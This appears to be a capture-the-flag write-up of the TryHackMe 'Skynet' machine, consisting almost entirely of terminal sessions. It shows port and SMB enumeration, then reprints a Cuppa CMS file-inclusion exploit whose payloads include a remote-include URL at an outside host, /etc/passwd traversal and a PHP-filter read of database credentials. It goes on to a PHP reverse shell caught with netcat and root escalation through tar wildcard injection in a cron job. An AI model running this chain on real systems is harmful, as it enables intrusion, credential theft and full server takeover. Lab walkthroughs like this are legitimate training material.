1. Scannning and Initial foothold
```bash
┌──(sabeshan㉿kali)-[~]
└─$ nmap -sS -A -sV -sC -T4 -p- 10.201.34.147 -vv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 17:10 IST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:10
Completed NSE at 17:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:10
Completed NSE at 17:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:10
Completed NSE at 17:10, 0.00s elapsed
Initiating Ping Scan at 17:10
Scanning 10.201.34.147 [4 ports]
Completed Ping Scan at 17:10, 0.32s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:10
Completed Parallel DNS resolution of 1 host. at 17:10, 0.08s elapsed
Initiating SYN Stealth Scan at 17:10
Scanning 10.201.34.147 [65535 ports]
Discovered open port 80/tcp on 10.201.34.147
Discovered open port 110/tcp on 10.201.34.147
Discovered open port 22/tcp on 10.201.34.147
Discovered open port 139/tcp on 10.201.34.147
Discovered open port 143/tcp on 10.201.34.147
Discovered open port 445/tcp on 10.201.34.147
Increasing send delay for 10.201.34.147 from 0 to 5 due to 1089 out of 2722 dropped probes since last increase.
Increasing send delay for 10.201.34.147 from 5 to 10 due to 16 out of 39 dropped probes since last increase.
SYN Stealth Scan Timing: About 6.39% done; ETC: 17:18 (0:07:34 remaining)
SYN Stealth Scan Timing: About 8.37% done; ETC: 17:22 (0:11:08 remaining)
SYN Stealth Scan Timing: About 10.42% done; ETC: 17:24 (0:13:02 remaining)
SYN Stealth Scan Timing: About 26.24% done; ETC: 17:26 (0:12:17 remaining)
SYN Stealth Scan Timing: About 35.19% done; ETC: 17:27 (0:11:27 remaining)
SYN Stealth Scan Timing: About 41.45% done; ETC: 17:28 (0:10:33 remaining)
SYN Stealth Scan Timing: About 46.75% done; ETC: 17:31 (0:11:28 remaining)
SYN Stealth Scan Timing: About 56.19% done; ETC: 17:33 (0:10:23 remaining)
SYN Stealth Scan Timing: About 61.93% done; ETC: 17:34 (0:09:10 remaining)
SYN Stealth Scan Timing: About 67.69% done; ETC: 17:34 (0:07:56 remaining)
SYN Stealth Scan Timing: About 72.86% done; ETC: 17:34 (0:06:42 remaining)
SYN Stealth Scan Timing: About 78.24% done; ETC: 17:35 (0:05:26 remaining)
SYN Stealth Scan Timing: About 83.43% done; ETC: 17:35 (0:04:10 remaining)
adjust_timeouts2: packet supposedly had rtt of 56351202 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of 56351202 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of 56348461 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of 56348461 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of 56355930 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of 56355930 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of 56347827 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of 56347827 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of 56317883 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of 56317883 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of 56308459 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of 56308459 microseconds.  Ignoring time.
SYN Stealth Scan Timing: About 88.91% done; ETC: 17:36 (0:02:53 remaining)
SYN Stealth Scan Timing: About 93.97% done; ETC: 17:35 (0:01:32 remaining)
Completed SYN Stealth Scan at 17:35, 1519.74s elapsed (65535 total ports)
Initiating Service scan at 17:35
Scanning 6 services on 10.201.34.147
Completed Service scan at 17:35, 11.89s elapsed (6 services on 1 host)
Initiating OS detection (try #1) against 10.201.34.147
Retrying OS detection (try #2) against 10.201.34.147
Retrying OS detection (try #3) against 10.201.34.147
WARNING: OS didn't match until try #3
Initiating Traceroute at 17:35
Completed Traceroute at 17:35, 3.03s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 17:35
Completed Parallel DNS resolution of 2 hosts. at 17:36, 6.58s elapsed
NSE: Script scanning 10.201.34.147.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:36
Completed NSE at 17:36, 9.14s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:36
Completed NSE at 17:36, 4.32s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:36
Completed NSE at 17:36, 0.00s elapsed
Nmap scan report for 10.201.34.147
Host is up, received echo-reply ttl 61 (0.27s latency).
Scanned at 2025-10-05 17:10:09 IST for 1565s
Not shown: 65529 closed tcp ports (reset)
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKeTyrvAfbRB4onlz23fmgH5DPnSz07voOYaVMKPx5bT62zn7eZzecIVvfp5LBCetcOyiw2Yhocs0oO1/RZSqXlwTVzRNKzznG4WTPtkvD7ws/4tv2cAGy1lzRy9b+361HHIXT8GNteq2mU+boz3kdZiiZHIml4oSGhI+/+IuSMl5clB5/FzKJ+mfmu4MRS8iahHlTciFlCpmQvoQFTA5s2PyzDHM6XjDYH1N3Euhk4xz44Xpo1hUZnu+P975/GadIkhr/Y0N5Sev+Kgso241/v0GQ2lKrYz3RPgmNv93AIQ4t3i3P6qDnta/06bfYDSEEJXaON+A9SCpk2YSrj4A7
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0UWS0x1ZsOGo510tgfVbNVhdE5LkzA4SWDW/5UjDumVQ7zIyWdstNAm+lkpZ23Iz3t8joaLcfs8nYCpMGa/xk=
|   256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICHVctcvlD2YZ4mLdmUlSwY8Ro0hCDMKGqZ2+DuI0KFQ
80/tcp  open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Skynet
110/tcp open  pop3        syn-ack ttl 61 Dovecot pop3d
|_pop3-capabilities: RESP-CODES SASL UIDL TOP AUTH-RESP-CODE PIPELINING CAPA
139/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack ttl 61 Dovecot imapd
|_imap-capabilities: LITERAL+ post-login SASL-IR IMAP4rev1 have LOGINDISABLEDA0001 listed capabilities Pre-login IDLE OK ENABLE more LOGIN-REFERRALS ID
445/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/5%OT=22%CT=1%CU=43564%PV=Y%DS=4%DC=T%G=Y%TM=68E25F3
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=105%GCD=1%ISR=10F%TI=Z%CI=RD%II=I%TS=8)SEQ(SP=FC%GCD=1%ISR=10C%TI=Z%
OS:CI=RD%II=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M50
OS:8ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%
OS:W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=
OS:Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y
OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%R
OS:D=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)I
OS:E(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.015 days (since Sun Oct  5 17:14:02 2025)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-10-05T12:06:21
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 55095/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 48470/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 17616/udp): CLEAN (Failed to receive data)
|   Check 4 (port 44581/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2025-10-05T07:06:21-05:00
|_clock-skew: mean: 1h40m19s, deviation: 2h53m12s, median: 18s
| nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SKYNET<00>           Flags: <unique><active>
|   SKYNET<03>           Flags: <unique><active>
|   SKYNET<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   995.35 ms 10.8.0.1
2   ... 3
4   56.80 ms  10.201.34.147

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:36
Completed NSE at 17:36, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:36
Completed NSE at 17:36, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:36
Completed NSE at 17:36, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1565.86 seconds
           Raw packets sent: 76275 (3.359MB) | Rcvd: 142099 (20.007MB)
```
---
I found smb shares while i'm find this things
```bash
┌──(sabeshan㉿kali)-[~]
└─$ smbclient -L //10.201.34.147// -U ''                  
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET
```
---
```bash
┌──(sabeshan㉿kali)-[~]
└─$ smbclient  \\\\10.201.34.147\\anonymous       
Password for [WORKGROUP\sabeshan]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 21:34:00 2020
  ..                                  D        0  Tue Sep 17 12:50:17 2019
  attention.txt                       N      163  Wed Sep 18 08:34:59 2019
  logs                                D        0  Wed Sep 18 10:12:16 2019

                9204224 blocks of size 1024. 5829928 blocks available
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 10:12:16 2019
  ..                                  D        0  Thu Nov 26 21:34:00 2020
  log2.txt                            N        0  Wed Sep 18 10:12:13 2019
  log1.txt                            N      471  Wed Sep 18 10:11:59 2019
  log3.txt                            N        0  Wed Sep 18 10:12:16 2019

                9204224 blocks of size 1024. 5829928 blocks available
smb: \logs\> ^C
```
---

<img width="1919" height="629" alt="image" src="https://github.com/user-attachments/assets/1bc58d2f-ba91-44fa-acc4-0670d1300b78" />

---

<img width="1919" height="533" alt="image" src="https://github.com/user-attachments/assets/708426e1-b631-4bf5-a76a-8ef470e4d4b3" />

---

```bash
┌──(sabeshan㉿kali)-[~/thm/skynet]
└─$ gobuster dir -u http://10.201.34.147/45kra24zxs28v3yd -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.34.147/45kra24zxs28v3yd
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/administrator        (Status: 301) [Size: 339] [--> http://10.201.34.147/45kra24zxs28v3yd/administrator/]
Progress: 66790 / 207644 (32.17%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 66874 / 207644 (32.21%)
===============================================================
Finished
===============================================================
                                                                                                                                                 
┌──(sabeshan㉿kali)-[~/thm/skynet]
└─$ searchsploit Cuppa       
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                | php/webapps/25971.txt
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                 
┌──(sabeshan㉿kali)-[~/thm/skynet]
└─$ ls 
attention.txt  important.txt  log1.txt  log2.txt  log3.txt
                                                                                                                                                 
┌──(sabeshan㉿kali)-[~/thm/skynet]
└─$ locate 25971.txt
/usr/share/exploitdb/exploits/php/webapps/25971.txt
                                                                                                                                                 
┌──(sabeshan㉿kali)-[~/thm/skynet]
└─$ cat /usr/share/exploitdb/exploits/php/webapps/25971.txt
# Exploit Title   : Cuppa CMS File Inclusion
# Date            : 4 June 2013
# Exploit Author  : CWH Underground
# Site            : www.2600.in.th
# Vendor Homepage : http://www.cuppacms.com/
# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
# Version         : Beta
# Tested on       : Window and Linux

  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /
  / XXXXXX /
 (________(
  `------'

####################################
VULNERABILITY: PHP CODE INJECTION
####################################

/alerts/alertConfigField.php (LINE: 22)

-----------------------------------------------------------------------------
LINE 22:
        <?php include($_REQUEST["urlConfig"]); ?>
-----------------------------------------------------------------------------


#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
-----------------------------------------------------------------------------

Base64 Encode Output:
-----------------------------------------------------------------------------
PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
-----------------------------------------------------------------------------

Base64 Decode Output:
-----------------------------------------------------------------------------
<?php
        class Configuration{
                public $host = "localhost";
                public $db = "cuppa";
                public $user = "root";
                public $password = "Db@dmin";
                public $table_prefix = "cu_";
                public $administrator_template = "default";
                public $list_limit = 25;
                public $token = "OBqIPqlFWf3X";
                public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
                public $upload_default_path = "media/uploadsFiles";
                public $maximum_file_size = "5242880";
                public $secure_login = 0;
                public $secure_login_value = "";
                public $secure_login_redirect = "";
        }
?>
-----------------------------------------------------------------------------

Able to read sensitive information via File Inclusion (PHP Stream)

################################################################################################################
 Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
################################################################################################################                                                                                                                                                 
┌──(sabeshan㉿kali)-[~/thm/skynet]
└─$ locate php_rev_shell
/home/sabeshan/php_rev_shell.php
/home/sabeshan/Downloads/php_rev_shell.php
/home/sabeshan/HTB/Certificate/malicious/php_rev_shell.php
/home/sabeshan/thm/php_rev_shell.php
/home/sabeshan/thm/adana/php_rev_shell.php
                                                                                                                                                 
┌──(sabeshan㉿kali)-[~/thm/skynet]
└─$ cp /home/sabeshan/thm/php_rev_shell.php .              
                                                                                                                                                 
┌──(sabeshan㉿kali)-[~/thm/skynet]
└─$ mousepad php_rev_shell.php 
```
---
```bash
┌──(sabeshan㉿kali)-[~/thm/skynet]
└─$ nc -lvnp 1337 
listening on [any] 1337 ...
connect to [10.8.183.109] from (UNKNOWN) [10.201.34.147] 49954
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 07:41:06 up  1:04,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1209): Inappropriate ioctl for device
bash: no job control in this shell
www-data@skynet:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@skynet:/$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                                                             
┌──(sabeshan㉿kali)-[~/thm/skynet]
└─$ stty raw -echo; fg          
[1]  + continued  nc -lvnp 1337

www-data@skynet:/$ cd /home
www-data@skynet:/home$ ls 
milesdyson
www-data@skynet:/home$ cd milesdyson
www-data@skynet:/home/milesdyson$ ls
backups  mail  share  user.txt
www-data@skynet:/home/milesdyson$ cat user.txt 
7ce5c2109a40f958099283600a9ae807
www-data@skynet:/home/milesdyson$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
www-data@skynet:/home/milesdyson$ cd backups
www-data@skynet:/home/milesdyson/backups$ ls
backup.sh  backup.tgz
www-data@skynet:/home/milesdyson/backups$ ls -la
total 4584
drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4679680 Oct  5 07:43 backup.tgz
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
</bin/bash\nchmod +s /bin/bash' > /var/www/html/root_shell.sh                
</www/html/--checkpoint-action=exec=sh root_shell.sh"                        
<dyson/backups$ touch "/var/www/html/--checkpoint=1"                         
www-data@skynet:/home/milesdyson/backups$ cd /var/www/html
www-data@skynet:/var/www/html$ ls -la
total 72
-rw-rw-rw- 1 www-data www-data     0 Oct  5 07:46 --checkpoint-action=exec=sh root_shell.sh
-rw-rw-rw- 1 www-data www-data     0 Oct  5 07:46 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Oct  5 07:46 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-rw-rw- 1 www-data www-data    31 Oct  5 07:45 root_shell.sh
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
www-data@skynet:/var/www/html$ cd -
/home/milesdyson/backups
www-data@skynet:/home/milesdyson/backups$ ls -la
total 4584
drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4679680 Oct  5 07:47 backup.tgz
www-data@skynet:/home/milesdyson/backups$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
www-data@skynet:/home/milesdyson/backups$ /bin/bash -p
bash-4.3# cat /root/root.txt
3f0372db24753accc7179a282cd6a949
```


